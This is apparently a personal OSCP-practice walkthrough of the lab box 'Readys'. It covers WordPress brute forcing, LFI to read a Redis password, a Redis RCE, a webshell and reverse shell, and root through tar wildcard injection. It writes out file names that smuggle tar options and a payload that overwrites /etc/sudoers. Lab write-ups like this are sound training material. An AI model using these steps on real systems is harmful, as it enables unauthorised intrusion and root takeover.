@@ -1,0 +1,236 @@
+**Start 08:08 15-05-2025**
+
+---
+```
+Scope:
+192.168.169.166
+```
+# Recon
+
+## Nmap
+
+```bash
+sudo nmap -sC -sV readys -sT -vvvv -p- -Pn -T5 --min-rate=5000
+
+PORT     STATE SERVICE REASON  VERSION
+22/tcp   open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+80/tcp   open  http    syn-ack Apache httpd 2.4.38 ((Debian))
+|_http-title: Readys &#8211; Just another WordPress site
+|_http-generator: WordPress 5.7.2
+|_http-server-header: Apache/2.4.38 (Debian)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+6379/tcp open  redis   syn-ack Redis key-value store
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+We find a **Redis** port open but we don't know the exact version running, regardless this will LIKELY be our attack vector.
+
+I tried out the `rce` script that I had ready but it wouldn't run, meaning this version is HIGHLY LIKELY < 5.0.9
+
+![](../../../assets/326b9597063fe472c234e5f3478e9830.png)
+
+I wasn't able to banner grab the info either:
+
+![](../../../assets/a9b7ac8718d8493aa148c2bf8b35029c.png)
+
+## 80/TCP - HTTP
+
+Here we find a standard **WordPress** site running:
+
+![](../../../assets/a5f9b065cab5890182b28eb52bcc14b2.png)
+
+I tried out `admin - admin` on the `/wp-admin` page and got the following:
+
+![](../../../assets/9a6799bcd8c2dddbe6860db3eab2000c.png)
+
+### Login Brute Forcing
+
+Meaning the *admin* user exists, but we just need to brute force the password with `hydra` for example.
+
+![](../../../assets/32a91cef34c3608e7ca491fc3c6a0782.png)
+
+This just gave a bunch of false positives.
+
+At the same time I launched `gobuster` to enumerate directories:
+
+![](../../../assets/2304309a70ea6c82684769597a64ca47.png)
+
+I noticed the `xmlrpc.php` endpoint so launched a `wp-scan` to brute force that way:
+
+```bash
+sudo wpscan --password-attack xmlrpc -t 20 -U admin -P /usr/share/wordlists/rockyou.txt --url http://readys
+```
+
+This took longer than usual so I quit it:
+
+![](../../../assets/7b1178c2564aa68e5b7cd7166dfa994b.png)
+
+I checked the other results of `gobuster` to see if I could create an account.
+
+![](../../../assets/0fb056909facf2edbc8ed819769d7627.png)
+
+User registration was not allowed either so I was sorta fucked?
+
+### WP-Scan
+
+Our attacks were narrowing down, let's run a regular `wp-scan` to enumerate it, maybe there's a vulnerable plugin of some sort.
+
+![](../../../assets/4cf09628d6469df061f01fd7564f54a9.png)
+
+Weird?
+
+Instead I checked with `curl` and found the following:
+
+![](../../../assets/1e2003f4084b9183cac31ec63a49f17b.png)
+
+## LFI
+
+![](../../../assets/a501feadc9a3b8dfe5901184cfab23a8.png)
+
+![](../../../assets/712fb8f19408902cabf3a003711dcb13.png)
+
+Let's test it out?
+
+![](../../../assets/0b58e017cb1633f498b700e1857e831d.png)
+
+Holy shit it works!
+
+>[!note]
+>I tried getting `id_rsa` keys but of course that would be too simple, so obviously it didn't work.
+
+Now we know already that the main attack vector will be via the Redis port, but we need a password. From the HackTricks site we have found that the credentials could be stored inside the `redis.conf` file:
+
+![](../../../assets/1c96c2834e9dca879f704f6f5587be1b.png)
+
+I checked where I could find it:
+
+![](../../../assets/270175031340585ac67ff9143c820325.png)
+
+![](../../../assets/562e6fd69f86886ee1ae76576dbbf1b0.png)
+
+This gave me an absolute massive output.
+
+I instead used `curl` again:
+
+![](../../../assets/960c26de6d7a628fff612c7f10f6e3f8.png)
+
+We found the password! We can now go on and use the `rce` script to gain access.
+
+# Foothold
+## Shell as Redis
+
+![](../../../assets/d9ca81593ee82bce1dd7dbdd7b8860dd.png)
+
+We easily get a shell and can move on to enumerate further.
+
+I couldn't access `/home`:
+
+![](../../../assets/94df6750241fb323355ca263a4881ee1.png)
+
+So I started enumerating further
+
+![](../../../assets/7c0f01a0caff66f6834419b702e3e3e9.png)
+
+Here I didn't find anything either, back to the webroot then.
+
+![](../../../assets/621cf83e99a411ac8f5ef645c29d959e.png)
+
+I checked out the `wp-config.php` file:
+
+![](../../../assets/08af54e8813f3e2fc10b54205027ee04.png)
+
+I found a new set of creds:
+
+```
+karl
+Wordpress1234
+```
+
+They're for `mysql`, let's see if the port is open locally.
+
+![](../../../assets/6782b4660fc321642254b3e41ca8f85f.png)
+
+Indeed it is! Let's log in
+
+## MySQL
+
+![](../../../assets/e2b79092ee5b2754a8700a3289dd1279.png)
+
+![](../../../assets/63fbf3fa10f371b5ce67af186facb00a.png)
+
+I tried to crack it with `hashcat` but it took a suuuper long time so in the meantime I started enumerating further.
+
+## Shell as Alice
+
+I used the following command to find other directories I could write to.
+
+```bash
+find / -type d -maxdepth 5 -writable 2>/dev/null
+```
+
+![](../../../assets/cce2fba7079db600825a66174306ba27.png)
+
+I wrote a `webshell.php` to `/opt/redis-files`. The premise here is now to go and activate the webshell via the LFI vulnerability and hopefully be able to get a reverse shell as *alice* this time.
+
+![](../../../assets/528350931889f1122b260e0e42aeaf98.png)
+
+>[!success]
+>Hurray! Let's get our reverse shell!
+
+![](../../../assets/83d0016642b4508462cfabfb64c2437c.png)
+
+![](../../../assets/eb8e2ad39da142986abe66dc4049e7ac.png)
+
+![](../../../assets/380cd578ac1a4ff9f0d185f87a113eb4.png)
+
+>[!tip]
+>`penelope` is super handy in these cases!
+
+### local.txt
+
+![](../../../assets/0312cd5992086039953bee1939a28e1a.png)
+
+# Privilege Escalation
+## Tar Wildcard
+
+I uploaded and launched `linpeas.sh`:
+
+![](../../../assets/b80506bf97aee0a796087d947774002b.png)
+
+![](../../../assets/ff16a6f46734607b7279dd9ec03b62be.png)
+
+>[!note]
+>We find a `tar` wildcard which can be exploited, we found this earlier in [[Cockpit#Enumeration]] as well as [[OSCP C#Tar Wildcard]] 
+>
+
+We need to do the following inside the `/var/www/html` directory as per the script:
+
+```bash
+# Enter the following
+touch "./--checkpoint=1"
+touch "./--checkpoint-action=exec=sh payload.sh"
+
+# Create a payload.sh file
+cat > payload.sh
+echo 'alice ALL=(root) NOPASSWD: ALL' > /etc/sudoers  
+
+# Make sure the payload is executable
+chmod +x payload.sh
+```
+
+Now we wait for a little while and:
+
+![](../../../assets/529ee2f1088a300534d56c7c1fd6961a.png)
+
+### proof.txt
+
+![](../../../assets/eef9dfc4ca0b6a2d6803a4899425bd3f.png)
+
+---
+
+**Finished 10:20 15-05-2025**
+
+[^Links]: [[OSCP Prep]]
+
+#tar #wildcard #redis #Wordpress #LFI 
